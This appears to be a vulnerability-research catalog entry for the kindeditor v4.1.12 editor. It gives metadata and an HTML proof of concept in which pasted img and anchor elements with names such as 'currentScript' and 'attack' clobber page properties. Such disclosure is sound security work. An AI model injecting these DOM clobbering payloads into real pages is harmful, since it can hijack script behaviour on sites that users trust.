## kindeditor

### Meta

+ Library: kindeditor
+ Version: v4.1.12
+ Stars: 1.9K
+ Fingerprint: `window.KindEditor !== undefined`
+ Input: Copy&Paste
+ Sanitizer: N/A
+ Capability: Any named property
+ CVE: N/A
+ Status: N/A

### Library

https://github.com/kindsoft/kindeditor
http://kindeditor.net/demo.php

### Vulnerable Code Snippet

N/A

### PoC 

```html
<!--Library-->
<script src="./kindeditor-all-min.js"></script>
<textarea id="editor_id" name="content" style="width:700px;height:300px;">HELLOWORLD!  </textarea>
<script> KindEditor.ready(function(K) { window.editor = K.create('#editor_id');}); </script>
<!--Library-->


<!--Payload-->
<img name="currentScript" src="https://xxx.xxx.xxx">
<img name="attack" src="https://xxx.xxx.xxx">
<a name="attack" href="https://xxx.xxx.xxx">AAA</a>
<p>Copy&Paste the following rendered HTML elements to the editor and check the editor in the debugging console: `html = editor.html();`.</p>
<!--Payload-->
```